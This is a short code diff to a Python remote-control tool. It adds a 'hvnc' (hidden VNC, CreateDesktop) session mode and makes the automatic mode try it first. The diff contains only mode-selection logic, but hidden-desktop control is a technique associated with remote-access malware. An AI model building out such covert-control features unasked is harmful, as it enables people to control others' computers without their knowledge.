@@ -137,21 +137,25 @@ def build_session_resources(mode: str | None) -> SessionResources:
             set_stream_profile=_set_stream_profile,
             set_cursor_visibility=cursor_controller.set_visible,
         )
-    if normalized in {"hidden", "printwindow"}:
+    if normalized in {"hidden", "printwindow", "hvnc"}:
         # Determine which mode to use
         if normalized == "printwindow":
             session_mode = "printwindow"
+        elif normalized == "hvnc":
+            session_mode = "hvnc"
         else:
             # Check environment variable for preferred hidden mode
             env_mode = os.getenv("RC_HIDDEN_MODE", "auto").strip().lower()
-            if env_mode in {"printwindow", "pw"}:
+            if env_mode in {"hvnc", "hiddenvnc", "createdesktop"}:
+                session_mode = "hvnc"
+            elif env_mode in {"printwindow", "pw"}:
                 session_mode = "printwindow"
             elif env_mode in {"virtual_display", "vd", "driver"}:
                 session_mode = "virtual_display"
             elif env_mode in {"fallback", "legacy"}:
                 session_mode = "fallback"
             else:
-                session_mode = "auto"
+                session_mode = "auto"  # auto now tries hvnc first
         
         try:
             hidden_session = create_hidden_session(mode=session_mode)
